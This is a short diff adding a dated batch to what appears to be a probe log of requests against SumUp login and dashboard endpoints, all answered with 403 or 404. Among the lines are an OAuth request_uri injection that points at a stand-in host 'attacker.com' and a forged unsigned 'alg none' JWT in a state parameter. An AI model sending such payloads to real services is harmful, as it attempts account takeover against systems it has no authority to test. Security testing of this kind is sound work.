@@ -130,3 +130,11 @@ https://me.sumup.com/api/sso/callback?error=test -> HTTP 403
 https://me.sumup.com/api/sso/callback -> HTTP 403
 https://me.sumup.com/_vercel/insights -> HTTP 404
 https://portal.sumup.com/ -> 200 len=?
+
+## 2026-09-05 04:44:52 UTC
+https://auth.sumup.com/oauth2/par -> HTTP 404
+https://dashboard.sumup.com/callback&request_uri=https://attacker.com/malicious.json&response_type=code&scope=classic -> HTTP 403
+https://portal.sumup.com/ -> 200 len=?
+https://me.sumup.com/api/sso/callback?state=eyJhbGciOiJub25lIn0.eyJhcHBTdGF0ZSI6e30nfQ -> HTTP 403
+https://me.sumup.com/api/sso/callback?state=malformed -> HTTP 403
+https://me.sumup.com/api/sso/callback -> HTTP 403
